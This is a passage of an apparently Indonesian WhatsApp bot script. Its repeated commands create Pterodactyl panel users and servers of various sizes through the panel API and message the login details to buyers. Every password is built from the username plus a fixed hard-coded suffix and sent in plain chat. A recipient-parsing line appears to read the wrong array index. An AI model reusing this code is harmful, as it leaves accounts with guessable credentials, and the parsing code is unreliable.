let egg = "15"
let loc = "1"
let memo = "17200"
let cpu = "510"
let disk = "17200"
let email = username + "@gmail.com"
let password = username + "82jx8"
if (!u) return
let d = (await RezzHost.onWhatsApp(u.split`@`[0]))[0] || {}
let deskripsi = `${hariini}${time} Create By ${pushname}`
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
},
"body": JSON.stringify({
"email": email,
"username": username,
"first_name": username,
"last_name": username,
"language": "en",
"password": password
})
})
let data = await f.json();
if (data.errors) return m.reply(JSON.stringify(data.errors[0], null, 2));
let user = data.attributes
let f2 = await fetch(domain + "/api/application/nests/5/eggs/" + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
m.reply(`_Sedang Membuat Server untuk @${u.split`@`[0]} bang @${m?.sender.split('@')[0]}..._`)
let ctf = `
*Hai @${u.split`@`[0]} Ini Data Panel Anda*
*DARI @${m?.sender.split('@')[0]}* `+readmore+`
┏━  ⬣『 *DATA  AKUN*  』⬣  ━┓
┣━━━━━━━━━━━━━━━━━━┓
┃ *Email :* ${email}
┃ *Username :* ${user.username}
┃ *Password :* ${password}
┃ *Ram :* ${memo} MB
┃ *Disk :* ${disk} MB
┃ *CPU :* ${cpu}%
┃ *Created :* ${pushname}
┃ *Hari :* ${hariini}
┃ *Jam :* ${time}
┣━━━━━━━━━━━━━━━━━━┫
┗━━━━━━━━━━━━━━━━━━┛
`+readmore+`
*PROFIT :*
- *BISA GANTI GANTI SC*
- *BOT DAPAT ON 24 JAM*
- *WEB CLOSE BOT ON*
- *GAK BOROS KUOTA*
- *GAK ABISIN RAM HP*
- *GARANSI 15 DAY*

*NOTES :*
- *JAGA BAIK² DATA PANEL ANDA*
- *OWN HANYA MENGIRIM 1X DATA*
- *MASUK GROUP UNTUK INFO*
- *SS PANEL DENGAN CP .DONE*
- *HUB ONW JIKA ADA KENDALA*
- *NO RUN SC DDOS*
- *NO DDOS DOMAIN*
- *NO SEBAR DOMAIN*

*LANGGAR? DI DELETE NO REFF*
`
let msg = generateWAMessageFromContent(from, {
viewOnceMessage: {
message: {
"messageContextInfo": {
"deviceListMetadata": {},
"deviceListMetadataVersion": 2
},
interactiveMessage: proto.Message.InteractiveMessage.create({
body: proto.Message.InteractiveMessage.Body.create({
text: ctf
}),
footer: proto.Message.InteractiveMessage.Footer.create({
text: `THANK YOU FOR ORDERING`
}),
header: proto.Message.InteractiveMessage.Header.create({

title: '',
gifPlayback: true,
subtitle: '',
hasMediaAttachment: true,...(await prepareWAMessageMedia({ image: { url: "https://telegra.ph/file/1203598f29d6839a8f61a.jpg" } }, { upload: RezzHost.waUploadToServer }))
}),
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
buttons: [
{
"name": "cta_url",
"buttonParamsJson": `{"display_text":"👤 CREATED","url":"https://wa.me/${m?.sender.split('@')[0]}?text=Done+bang+panel+nya+normal","merchant_url":"https://www.google.com"}`
}, {
"name": "cta_url",
"buttonParamsJson": `{"display_text":"👥 GROUP BUYER","url":"${global.gr}","merchant_url":"https://www.google.com"}`
}, {
"name": "cta_url",
"buttonParamsJson": `{"display_text":"🌐 LINK LOGIN","url":"${domain}","merchant_url":"https://www.google.com"}`
}, {
"name": "cta_copy",
"buttonParamsJson": JSON.stringify({
"display_text": "📛 COPY USERNAME",
"copy_code": `${user.username}`
})
},
{
"name": "cta_copy",
"buttonParamsJson": JSON.stringify({
"display_text": "🔐 COPY PASSWORD",
"copy_code": `${password}`
})
}
],
}),
contextInfo: {
mentionedJid: [m.sender], 
forwardingScore: 999,
isForwarded: false,
forwardedNewsletterMessageInfo: {
newsletterJid: '120363305511727707@newsletter',
newsletterName: `${ownername}`,
serverMessageId: 145
}
}})}}
}, {quoted: m})
await RezzHost.relayMessage(u, msg.message, {
messageId: msg.key.id
})
let data2 = await f2.json();
let startup_cmd = data2.attributes.startup

let f3 = await fetch(domain + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey,
},
"body": JSON.stringify({
"name": name,
"description": deskripsi,
"user": user.id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": memo,
"swap": 0,
"disk": disk,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 0,
"backups": 0,
"allocations": 0
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let res = await f3.json()
if (res.errors) return m.reply(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes
let p = await m.reply(`
*Sukses Creat Panel ✅*`+readmore+`
┏━  ⬣『 *DATA  AKUN*  』⬣  ━┓
┣━━━━━━━━━━━━━━━━━━┓
┃ *Email :* ${email}
┃ *Username :* ${user.username}
┃ *ID Server :* ${server.id}
┃ *ID User :* ${user.id}
┃ *Ram :* ${memo} MB
┃ *Disk :* ${disk} MB
┃ *CPU :* ${cpu}%
┃ *Created :* ${pushname}
┃ *Made Today:* ${hariini}
┃ *O'clock :* ${time}
┣━━━━━━━━━━━━━━━━━━┫
┗━━━━━━━━━━━━━━━━━━┛

Username dan Password Telah Dikirim
Ke @${u.split`@`[0]} Bang @${m?.sender.split('@')[0]}`)

}
break
case 'cp18gb': 
case '18gb':
case 'panel18gb': {
if (!isPrem && !isCreator) return reply2(`Fitur Khusus Premium silahkan beli paket premium di owner dengan cara ketik *.owner*`)
let t = text.split(',');
if (t.length < 2) return m.reply(`*Contoh :* ${prefix+command} username,nomer`)
let username = t[0];
let u = m.quoted ? m.quoted.sender : t[1] ? t[3].replace(/[^+0-9]/g, '') + '@s.whatsapp.net' : m.mentionedJid[0];
let name = username
let egg = "15"
let loc = "1"
let memo = "18200"
let cpu = "540"
let disk = "18200"
let email = username + "@gmail.com"
let password = username + "27xyx8"
if (!u) return
let d = (await RezzHost.onWhatsApp(u.split`@`[0]))[0] || {}
let deskripsi = `${hariini}${time} Create By ${pushname}`
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
},
"body": JSON.stringify({
"email": email,
"username": username,
"first_name": username,
"last_name": username,
"language": "en",
"password": password
})
})
let data = await f.json();
if (data.errors) return m.reply(JSON.stringify(data.errors[0], null, 2));
let user = data.attributes
let f2 = await fetch(domain + "/api/application/nests/5/eggs/" + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
m.reply(`_Sedang Membuat Server untuk @${u.split`@`[0]} bang @${m?.sender.split('@')[0]}..._`)
let ctf = `
*Hai @${u.split`@`[0]} Ini Data Panel Anda*
*DARI @${m?.sender.split('@')[0]}* `+readmore+`
┏━  ⬣『 *DATA  AKUN*  』⬣  ━┓
┣━━━━━━━━━━━━━━━━━━┓
┃ *Email :* ${email}
┃ *Username :* ${user.username}
┃ *Password :* ${password}
┃ *Ram :* ${memo} MB
┃ *Disk :* ${disk} MB
┃ *CPU :* ${cpu}%
┃ *Created :* ${pushname}
┃ *Hari :* ${hariini}
┃ *Jam :* ${time}
┣━━━━━━━━━━━━━━━━━━┫
┗━━━━━━━━━━━━━━━━━━┛
`+readmore+`
*PROFIT :*
- *BISA GANTI GANTI SC*
- *BOT DAPAT ON 24 JAM*
- *WEB CLOSE BOT ON*
- *GAK BOROS KUOTA*
- *GAK ABISIN RAM HP*
- *GARANSI 15 DAY*

*NOTES :*
- *JAGA BAIK² DATA PANEL ANDA*
- *OWN HANYA MENGIRIM 1X DATA*
- *MASUK GROUP UNTUK INFO*
- *SS PANEL DENGAN CP .DONE*
- *HUB ONW JIKA ADA KENDALA*
- *NO RUN SC DDOS*
- *NO DDOS DOMAIN*
- *NO SEBAR DOMAIN*

*LANGGAR? DI DELETE NO REFF*
`
let msg = generateWAMessageFromContent(from, {
viewOnceMessage: {
message: {
"messageContextInfo": {
"deviceListMetadata": {},
"deviceListMetadataVersion": 2
},
interactiveMessage: proto.Message.InteractiveMessage.create({
body: proto.Message.InteractiveMessage.Body.create({
text: ctf
}),
footer: proto.Message.InteractiveMessage.Footer.create({
text: `THANK YOU FOR ORDERING`
}),
header: proto.Message.InteractiveMessage.Header.create({

title: '',
gifPlayback: true,
subtitle: '',
hasMediaAttachment: true,...(await prepareWAMessageMedia({ image: { url: "https://telegra.ph/file/1203598f29d6839a8f61a.jpg" } }, { upload: RezzHost.waUploadToServer }))
}),
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
buttons: [
{
"name": "cta_url",
"buttonParamsJson": `{"display_text":"👤 CREATED","url":"https://wa.me/${m?.sender.split('@')[0]}?text=Done+bang+panel+nya+normal","merchant_url":"https://www.google.com"}`
}, {
"name": "cta_url",
"buttonParamsJson": `{"display_text":"👥 GROUP BUYER","url":"${global.gr}","merchant_url":"https://www.google.com"}`
}, {
"name": "cta_url",
"buttonParamsJson": `{"display_text":"🌐 LINK LOGIN","url":"${domain}","merchant_url":"https://www.google.com"}`
}, {
"name": "cta_copy",
"buttonParamsJson": JSON.stringify({
"display_text": "📛 COPY USERNAME",
"copy_code": `${user.username}`
})
},
{
"name": "cta_copy",
"buttonParamsJson": JSON.stringify({
"display_text": "🔐 COPY PASSWORD",
"copy_code": `${password}`
})
}
],
}),
contextInfo: {
mentionedJid: [m.sender], 
forwardingScore: 999,
isForwarded: false,
forwardedNewsletterMessageInfo: {
newsletterJid: '120363305511727707@newsletter',
newsletterName: `${ownername}`,
serverMessageId: 145
}
}})}}
}, {quoted: m})
await RezzHost.relayMessage(u, msg.message, {
messageId: msg.key.id
})
let data2 = await f2.json();
let startup_cmd = data2.attributes.startup

let f3 = await fetch(domain + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey,
},
"body": JSON.stringify({
"name": name,
"description": deskripsi,
"user": user.id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": memo,
"swap": 0,
"disk": disk,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 0,
"backups": 0,
"allocations": 0
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let res = await f3.json()
if (res.errors) return m.reply(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes
let p = await m.reply(`
*Sukses Creat Panel ✅*`+readmore+`
┏━  ⬣『 *DATA  AKUN*  』⬣  ━┓
┣━━━━━━━━━━━━━━━━━━┓
┃ *Email :* ${email}
┃ *Username :* ${user.username}
┃ *ID Server :* ${server.id}
┃ *ID User :* ${user.id}
┃ *Ram :* ${memo} MB
┃ *Disk :* ${disk} MB
┃ *CPU :* ${cpu}%
┃ *Created :* ${pushname}
┃ *Made Today:* ${hariini}
┃ *O'clock :* ${time}
┣━━━━━━━━━━━━━━━━━━┫
┗━━━━━━━━━━━━━━━━━━┛

Username dan Password Telah Dikirim
Ke @${u.split`@`[0]} Bang @${m?.sender.split('@')[0]}`)

}
break
case 'cp19gb': 
case '19gb':
case 'panel19gb': {
if (!isPrem && !isCreator) return reply2(`Fitur Khusus Premium silahkan beli paket premium di owner dengan cara ketik *.owner*`)
let t = text.split(',');
if (t.length < 2) return m.reply(`*Contoh :* ${prefix+command} username,nomer`)
let username = t[0];
let u = m.quoted ? m.quoted.sender : t[1] ? t[3].replace(/[^+0-9]/g, '') + '@s.whatsapp.net' : m.mentionedJid[0];
let name = username
let egg = "15"
let loc = "1"
let memo = "19200"
let cpu = "570"
let disk = "19200"
let email = username + "@gmail.com"
let password = username + "8wuxj28"
if (!u) return
let d = (await RezzHost.onWhatsApp(u.split`@`[0]))[0] || {}
let deskripsi = `${hariini}${time} Create By ${pushname}`
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
},
"body": JSON.stringify({
"email": email,
"username": username,
"first_name": username,
"last_name": username,
"language": "en",
"password": password
})
})
let data = await f.json();
if (data.errors) return m.reply(JSON.stringify(data.errors[0], null, 2));
let user = data.attributes
let f2 = await fetch(domain + "/api/application/nests/5/eggs/" + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
m.reply(`_Sedang Membuat Server untuk @${u.split`@`[0]} bang @${m?.sender.split('@')[0]}..._`)
let ctf = `
*Hai @${u.split`@`[0]} Ini Data Panel Anda*
*DARI @${m?.sender.split('@')[0]}* `+readmore+`
┏━  ⬣『 *DATA  AKUN*  』⬣  ━┓
┣━━━━━━━━━━━━━━━━━━┓
┃ *Email :* ${email}
┃ *Username :* ${user.username}
┃ *Password :* ${password}
┃ *Ram :* ${memo} MB
┃ *Disk :* ${disk} MB
┃ *CPU :* ${cpu}%
┃ *Created :* ${pushname}
┃ *Hari :* ${hariini}
┃ *Jam :* ${time}
┣━━━━━━━━━━━━━━━━━━┫
┗━━━━━━━━━━━━━━━━━━┛
`+readmore+`
*PROFIT :*
- *BISA GANTI GANTI SC*
- *BOT DAPAT ON 24 JAM*
- *WEB CLOSE BOT ON*
- *GAK BOROS KUOTA*
- *GAK ABISIN RAM HP*
- *GARANSI 15 DAY*

*NOTES :*
- *JAGA BAIK² DATA PANEL ANDA*
- *OWN HANYA MENGIRIM 1X DATA*
- *MASUK GROUP UNTUK INFO*
- *SS PANEL DENGAN CP .DONE*
- *HUB ONW JIKA ADA KENDALA*
- *NO RUN SC DDOS*
- *NO DDOS DOMAIN*
- *NO SEBAR DOMAIN*

*LANGGAR? DI DELETE NO REFF*
`
let msg = generateWAMessageFromContent(from, {
viewOnceMessage: {
message: {
"messageContextInfo": {
"deviceListMetadata": {},
"deviceListMetadataVersion": 2
},
interactiveMessage: proto.Message.InteractiveMessage.create({
body: proto.Message.InteractiveMessage.Body.create({
text: ctf
}),
footer: proto.Message.InteractiveMessage.Footer.create({
text: `THANK YOU FOR ORDERING`
}),
header: proto.Message.InteractiveMessage.Header.create({

title: '',
gifPlayback: true,
subtitle: '',
hasMediaAttachment: true,...(await prepareWAMessageMedia({ image: { url: "https://telegra.ph/file/1203598f29d6839a8f61a.jpg" } }, { upload: RezzHost.waUploadToServer }))
}),
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
buttons: [
{
"name": "cta_url",
"buttonParamsJson": `{"display_text":"👤 CREATED","url":"https://wa.me/${m?.sender.split('@')[0]}?text=Done+bang+panel+nya+normal","merchant_url":"https://www.google.com"}`
}, {
"name": "cta_url",
"buttonParamsJson": `{"display_text":"👥 GROUP BUYER","url":"${global.gr}","merchant_url":"https://www.google.com"}`
}, {
"name": "cta_url",
"buttonParamsJson": `{"display_text":"🌐 LINK LOGIN","url":"${domain}","merchant_url":"https://www.google.com"}`
}, {
"name": "cta_copy",
"buttonParamsJson": JSON.stringify({
"display_text": "📛 COPY USERNAME",
"copy_code": `${user.username}`
})
},
{
"name": "cta_copy",
"buttonParamsJson": JSON.stringify({
"display_text": "🔐 COPY PASSWORD",
"copy_code": `${password}`
})
}
],
}),
contextInfo: {
mentionedJid: [m.sender], 
forwardingScore: 999,
isForwarded: false,
forwardedNewsletterMessageInfo: {
newsletterJid: '120363305511727707@newsletter',
newsletterName: `${ownername}`,
serverMessageId: 145
}
}})}}
}, {quoted: m})
await RezzHost.relayMessage(u, msg.message, {
messageId: msg.key.id
})
let data2 = await f2.json();
let startup_cmd = data2.attributes.startup

let f3 = await fetch(domain + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey,
},
"body": JSON.stringify({
"name": name,
"description": deskripsi,
"user": user.id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": memo,
"swap": 0,
"disk": disk,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 0,
"backups": 0,
"allocations": 0
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let res = await f3.json()
if (res.errors) return m.reply(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes
let p = await m.reply(`
*Sukses Creat Panel ✅*`+readmore+`
┏━  ⬣『 *DATA  AKUN*  』⬣  ━┓
┣━━━━━━━━━━━━━━━━━━┓
┃ *Email :* ${email}
┃ *Username :* ${user.username}
┃ *ID Server :* ${server.id}
┃ *ID User :* ${user.id}
┃ *Ram :* ${memo} MB
┃ *Disk :* ${disk} MB
┃ *CPU :* ${cpu}%
┃ *Created :* ${pushname}
┃ *Made Today:* ${hariini}
┃ *O'clock :* ${time}
┣━━━━━━━━━━━━━━━━━━┫
┗━━━━━━━━━━━━━━━━━━┛

Username dan Password Telah Dikirim
Ke @${u.split`@`[0]} Bang @${m?.sender.split('@')[0]}`)

}
break
case 'cp20gb': 
case '20gb':
case 'panel20gb': {
if (!isPrem && !isCreator) return reply2(`Fitur Khusus Premium silahkan beli paket premium di owner dengan cara ketik *.owner*`)
let t = text.split(',');
if (t.length < 2) return m.reply(`*Contoh :* ${prefix+command} username,nomer`)
let username = t[0];
let u = m.quoted ? m.quoted.sender : t[1] ? t[3].replace(/[^+0-9]/g, '') + '@s.whatsapp.net' : m.mentionedJid[0];
let name = username
let egg = "15"
let loc = "1"
let memo = "20200"
let cpu = "600"
let disk = "20200"
let email = username + "@gmail.com"
let password = username + "38duc3"
if (!u) return
let d = (await RezzHost.onWhatsApp(u.split`@`[0]))[0] || {}
let deskripsi = `${hariini}${time} Create By ${pushname}`
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
},
"body": JSON.stringify({
"email": email,
"username": username,
"first_name": username,
"last_name": username,
"language": "en",
"password": password
})
})
let data = await f.json();
if (data.errors) return m.reply(JSON.stringify(data.errors[0], null, 2));
let user = data.attributes
let f2 = await fetch(domain + "/api/application/nests/5/eggs/" + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
m.reply(`_Sedang Membuat Server untuk @${u.split`@`[0]} bang @${m?.sender.split('@')[0]}..._`)
let ctf = `
*Hai @${u.split`@`[0]} Ini Data Panel Anda*
*DARI @${m?.sender.split('@')[0]}* `+readmore+`
┏━  ⬣『 *DATA  AKUN*  』⬣  ━┓
┣━━━━━━━━━━━━━━━━━━┓
┃ *Email :* ${email}
┃ *Username :* ${user.username}
┃ *Password :* ${password}
┃ *Ram :* ${memo} MB
┃ *Disk :* ${disk} MB
┃ *CPU :* ${cpu}%
┃ *Created :* ${pushname}
┃ *Hari :* ${hariini}
┃ *Jam :* ${time}
┣━━━━━━━━━━━━━━━━━━┫
┗━━━━━━━━━━━━━━━━━━┛
`+readmore+`
*PROFIT :*
- *BISA GANTI GANTI SC*
- *BOT DAPAT ON 24 JAM*
- *WEB CLOSE BOT ON*
- *GAK BOROS KUOTA*
- *GAK ABISIN RAM HP*
- *GARANSI 15 DAY*

*NOTES :*
- *JAGA BAIK² DATA PANEL ANDA*
- *OWN HANYA MENGIRIM 1X DATA*
- *MASUK GROUP UNTUK INFO*
- *SS PANEL DENGAN CP .DONE*
- *HUB ONW JIKA ADA KENDALA*
- *NO RUN SC DDOS*
- *NO DDOS DOMAIN*
- *NO SEBAR DOMAIN*

*LANGGAR? DI DELETE NO REFF*
`
let msg = generateWAMessageFromContent(from, {
viewOnceMessage: {
message: {
"messageContextInfo": {
"deviceListMetadata": {},
"deviceListMetadataVersion": 2
},
interactiveMessage: proto.Message.InteractiveMessage.create({
body: proto.Message.InteractiveMessage.Body.create({
text: ctf
}),
footer: proto.Message.InteractiveMessage.Footer.create({
text: `THANK YOU FOR ORDERING`
}),
header: proto.Message.InteractiveMessage.Header.create({

title: '',
gifPlayback: true,
subtitle: '',
hasMediaAttachment: true,...(await prepareWAMessageMedia({ image: { url: "https://telegra.ph/file/1203598f29d6839a8f61a.jpg" } }, { upload: RezzHost.waUploadToServer }))
}),
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
buttons: [
{
"name": "cta_url",
"buttonParamsJson": `{"display_text":"👤 CREATED","url":"https://wa.me/${m?.sender.split('@')[0]}?text=Done+bang+panel+nya+normal","merchant_url":"https://www.google.com"}`
}, {
"name": "cta_url",
"buttonParamsJson": `{"display_text":"👥 GROUP BUYER","url":"${global.gr}","merchant_url":"https://www.google.com"}`
}, {
"name": "cta_url",
"buttonParamsJson": `{"display_text":"🌐 LINK LOGIN","url":"${domain}","merchant_url":"https://www.google.com"}`
}, {
"name": "cta_copy",
"buttonParamsJson": JSON.stringify({
"display_text": "📛 COPY USERNAME",
"copy_code": `${user.username}`
})
},
{
"name": "cta_copy",
"buttonParamsJson": JSON.stringify({
"display_text": "🔐 COPY PASSWORD",
"copy_code": `${password}`
})
}
],
}),
contextInfo: {
mentionedJid: [m.sender], 
forwardingScore: 999,
isForwarded: false,
forwardedNewsletterMessageInfo: {
newsletterJid: '120363305511727707@newsletter',
newsletterName: `${ownername}`,
serverMessageId: 145
}
}})}}
}, {quoted: m})
await RezzHost.relayMessage(u, msg.message, {
messageId: msg.key.id
})
let data2 = await f2.json();
let startup_cmd = data2.attributes.startup

let f3 = await fetch(domain + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey,
},
"body": JSON.stringify({
"name": name,
"description": deskripsi,
"user": user.id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": memo,
"swap": 0,
"disk": disk,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 0,
"backups": 0,
"allocations": 0
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let res = await f3.json()
if (res.errors) return m.reply(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes
let p = await m.reply(`
*Sukses Creat Panel ✅*`+readmore+`
┏━  ⬣『 *DATA  AKUN*  』⬣  ━┓
┣━━━━━━━━━━━━━━━━━━┓
┃ *Email :* ${email}
┃ *Username :* ${user.username}
┃ *ID Server :* ${server.id}
┃ *ID User :* ${user.id}
┃ *Ram :* ${memo} MB
┃ *Disk :* ${disk} MB
┃ *CPU :* ${cpu}%
┃ *Created :* ${pushname}
┃ *Made Today:* ${hariini}
┃ *O'clock :* ${time}
┣━━━━━━━━━━━━━━━━━━┫
┗━━━━━━━━━━━━━━━━━━┛

Username dan Password Telah Dikirim
Ke @${u.split`@`[0]} Bang @${m?.sender.split('@')[0]}`)

}
break
case 'cp21gb': 
case '21gb':
case 'panel21gb': {
if (!isPrem && !isCreator) return reply2(`Fitur Khusus Premium silahkan beli paket premium di owner dengan cara ketik *.owner*`)
let t = text.split(',');
if (t.length < 2) return m.reply(`*Contoh :* ${prefix+command} username,nomer`)
let username = t[0];
let u = m.quoted ? m.quoted.sender : t[1] ? t[3].replace(/[^+0-9]/g, '') + '@s.whatsapp.net' : m.mentionedJid[0];
let name = username
let egg = "15"
let loc = "1"
let memo = "21250"
let cpu = "630"
let disk = "21250"
let email = username + "@gmail.com"
let password = username + "83uxu3"
if (!u) return
let d = (await RezzHost.onWhatsApp(u.split`@`[0]))[0] || {}
let deskripsi = `${hariini}${time} Create By ${pushname}`
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
},
"body": JSON.stringify({
"email": email,
"username": username,
"first_name": username,
"last_name": username,
"language": "en",
"password": password
})
})
let data = await f.json();
if (data.errors) return m.reply(JSON.stringify(data.errors[0], null, 2));
let user = data.attributes
let f2 = await fetch(domain + "/api/application/nests/5/eggs/" + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
m.reply(`_Sedang Membuat Server untuk @${u.split`@`[0]} bang @${m?.sender.split('@')[0]}..._`)
let ctf = `
*Hai @${u.split`@`[0]} Ini Data Panel Anda*
*DARI @${m?.sender.split('@')[0]}* `+readmore+`
┏━  ⬣『 *DATA  AKUN*  』⬣  ━┓
┣━━━━━━━━━━━━━━━━━━┓
┃ *Email :* ${email}
┃ *Username :* ${user.username}
┃ *Password :* ${password}
┃ *Ram :* ${memo} MB
┃ *Disk :* ${disk} MB
┃ *CPU :* ${cpu}%
┃ *Created :* ${pushname}
┃ *Hari :* ${hariini}
┃ *Jam :* ${time}
┣━━━━━━━━━━━━━━━━━━┫
┗━━━━━━━━━━━━━━━━━━┛
`+readmore+`
*PROFIT :*
- *BISA GANTI GANTI SC*
- *BOT DAPAT ON 24 JAM*
- *WEB CLOSE BOT ON*
- *GAK BOROS KUOTA*
- *GAK ABISIN RAM HP*
- *GARANSI 15 DAY*

*NOTES :*
- *JAGA BAIK² DATA PANEL ANDA*
- *OWN HANYA MENGIRIM 1X DATA*
- *MASUK GROUP UNTUK INFO*
- *SS PANEL DENGAN CP .DONE*
- *HUB ONW JIKA ADA KENDALA*
- *NO RUN SC DDOS*
- *NO DDOS DOMAIN*
- *NO SEBAR DOMAIN*

*LANGGAR? DI DELETE NO REFF*
`
let msg = generateWAMessageFromContent(from, {
viewOnceMessage: {
message: {
"messageContextInfo": {
"deviceListMetadata": {},
"deviceListMetadataVersion": 2
},
interactiveMessage: proto.Message.InteractiveMessage.create({
body: proto.Message.InteractiveMessage.Body.create({
text: ctf
}),
footer: proto.Message.InteractiveMessage.Footer.create({
text: `THANK YOU FOR ORDERING`
}),
header: proto.Message.InteractiveMessage.Header.create({

title: '',
gifPlayback: true,
subtitle: '',
hasMediaAttachment: true,...(await prepareWAMessageMedia({ image: { url: "https://telegra.ph/file/1203598f29d6839a8f61a.jpg" } }, { upload: RezzHost.waUploadToServer }))
}),
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
buttons: [
{
"name": "cta_url",
"buttonParamsJson": `{"display_text":"👤 CREATED","url":"https://wa.me/${m?.sender.split('@')[0]}?text=Done+bang+panel+nya+normal","merchant_url":"https://www.google.com"}`
}, {
"name": "cta_url",
"buttonParamsJson": `{"display_text":"👥 GROUP BUYER","url":"${global.gr}","merchant_url":"https://www.google.com"}`
}, {
"name": "cta_url",
"buttonParamsJson": `{"display_text":"🌐 LINK LOGIN","url":"${domain}","merchant_url":"https://www.google.com"}`
}, {
"name": "cta_copy",
"buttonParamsJson": JSON.stringify({
"display_text": "📛 COPY USERNAME",
"copy_code": `${user.username}`
})
},
{
"name": "cta_copy",
"buttonParamsJson": JSON.stringify({
"display_text": "🔐 COPY PASSWORD",
"copy_code": `${password}`
})
}
],
}),
contextInfo: {
mentionedJid: [m.sender], 
forwardingScore: 999,
isForwarded: false,
forwardedNewsletterMessageInfo: {
newsletterJid: '120363305511727707@newsletter',
newsletterName: `${ownername}`,
serverMessageId: 145
}
}})}}
}, {quoted: m})
await RezzHost.relayMessage(u, msg.message, {
messageId: msg.key.id
})
let data2 = await f2.json();
let startup_cmd = data2.attributes.startup

let f3 = await fetch(domain + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey,
},
"body": JSON.stringify({
"name": name,
"description": deskripsi,
"user": user.id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": memo,
"swap": 0,
"disk": disk,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 0,
"backups": 0,
"allocations": 0
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let res = await f3.json()
if (res.errors) return m.reply(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes
let p = await m.reply(`
*Sukses Creat Panel ✅*`+readmore+`
┏━  ⬣『 *DATA  AKUN*  』⬣  ━┓
┣━━━━━━━━━━━━━━━━━━┓
┃ *Email :* ${email}
┃ *Username :* ${user.username}
┃ *ID Server :* ${server.id}
┃ *ID User :* ${user.id}
┃ *Ram :* ${memo} MB
┃ *Disk :* ${disk} MB
┃ *CPU :* ${cpu}%
┃ *Created :* ${pushname}
┃ *Made Today:* ${hariini}
┃ *O'clock :* ${time}
┣━━━━━━━━━━━━━━━━━━┫
┗━━━━━━━━━━━━━━━━━━┛

Username dan Password Telah Dikirim
Ke @${u.split`@`[0]} Bang @${m?.sender.split('@')[0]}`)

}
break
case 'cp22gb': 
case '22gb':
case 'panel22gb': {
if (!isPrem && !isCreator) return reply2(`Fitur Khusus Premium silahkan beli paket premium di owner dengan cara ketik *.owner*`)
let t = text.split(',');
if (t.length < 2) return m.reply(`*Contoh :* ${prefix+command} username,nomer`)
let username = t[0];
